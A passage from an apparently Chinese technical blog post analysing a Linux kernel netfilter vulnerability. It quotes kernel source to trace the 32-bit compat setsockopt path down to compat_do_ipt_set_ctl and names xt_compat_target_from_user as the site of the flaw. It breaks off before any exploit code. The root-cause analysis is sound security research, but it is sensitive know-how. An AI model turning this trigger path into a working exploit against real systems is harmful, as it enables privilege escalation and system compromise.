c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的函数，这里因为我们开启了编译选项 <code>CONFIG_COMPAT</code>（默认开启），<strong>所以 setsockopt 系统调用最终应该会调用到</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">inet_stream_ops</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_sock_common_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_sock_common_getsockopt,</span><br><span class="line">.compat_ioctl   = inet_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.set_rcvlowat   = tcp_set_rcvlowat,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>他又会调用到 <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>compat_setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">      optval, optlen);</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_sock_common_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>又绕回到 <code>inet_create</code>，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>compat_tcp_setsockopt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> <span class="title">tcp_prot</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt= compat_tcp_setsockopt,</span><br><span class="line">.compat_getsockopt= compat_tcp_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.diag_destroy= tcp_abort,</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(tcp_prot);</span><br></pre></td></tr></table></figure><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,</span><br><span class="line">  optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_tcp_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在 <code>inet_csk_compat_setsockopt</code> 中会调用到 <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">inet_csk_compat_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">       <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">    optval, optlen);</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 <strong>socket 中 sock 结构体的初始化过程</strong>，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最后应该调用到 <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line">.queue_xmit   = ip_queue_xmit,</span><br><span class="line">.send_check   = tcp_v4_send_check,</span><br><span class="line">.rebuild_header   = inet_sk_rebuild_header,</span><br><span class="line">.sk_rx_dst_set   = inet_sk_rx_dst_set,</span><br><span class="line">.conn_request   = tcp_v4_conn_request,</span><br><span class="line">.syn_recv_sock   = tcp_v4_syn_recv_sock,</span><br><span class="line">.net_header_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iphdr),</span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br><span class="line">.addr2sockaddr   = inet_csk_addr2sockaddr,</span><br><span class="line">.sockaddr_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_ip_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_ip_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.mtu_reduced   = tcp_v4_mtu_reduced,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于我们开启了 Netfilter，所以在 <code>compat_ip_setsockopt()</code> 最后会调用到 <code>compat_nf_setsockopt</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params"> <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = compat_nf_setsockopt(sk, PF_INET, optname, optval,</span><br><span class="line">   optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_ip_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个函数和 <code>compat_nf_getsockopt()</code> 一样都是 <code>compat_nf_sockopt()</code> 的 wrapper，在该函数中会使用 找到对应的函数表，根据对应操作调用对应函数，我们是 32 位进程的系统调用，所以应该走入 <code>compat_set</code>这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">compat_nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_get)</span><br><span class="line">ret = ops-&gt;compat_get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_set)</span><br><span class="line">ret = ops-&gt;compat_set(sk, val, opt, *len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么具体调用到哪个函数？在 <code>nf_sockopt_find</code> 中使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>compat_ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>compat_do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>前面讲到 32 位程序的 setsockopt 系统调用最终会调用到 <code>compat_do_ipt_set_ctl()</code>，而漏洞便发生在当我们指定 optname 为 <code>IPT_SO_SET_REPLACE</code> 时，其最终会调用 <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">compat_do_ipt_set_ctl</span><span class="params">(<span class="keyword">struct</span> sock *sk,<span class="type">int</span> cmd, <span class="type">void</span> __user *user,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_REPLACE:</span><br><span class="line">ret = compat_do_replace(sock_net(sk), user, len);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_ADD_COUNTERS:</span><br><span class="line">ret = do_add_counters(sock_net(sk), user, len, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">compat_do_ipt_set_ctl()</span><br><span class="line">    compat_do_replace()</span><br><span class="line">    translate_compat_table()</span><br><span class="line">    compat_copy_entry_from_user()</span><br><span class="line">    xt_compat_match_from_user()</span><br><span class="line">    xt_compat_target_from_user()</span><br></pre></td></tr></table></figure><p>这里提前说明：<strong>漏洞在</strong> <code>xt_compat_match_from_user()</code> <strong>与</strong> <code>xt_compat_target_from_user()</code> <strong>中都存在，逻辑相同</strong></p><p>我们先来看 <code>xt_compat_target_from_user()</code>，在这里会将 <code>t-&gt;data + target-&gt;targetsize</code> 起始的长度为 <code>pad</code> 的区域置 0：先将 targetsize 向上与 8 对齐，之后再减去 targetsize，剩下的这段自然就是分配的 object 减去 targetsize 后的剩余空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_target_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_target *t, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span 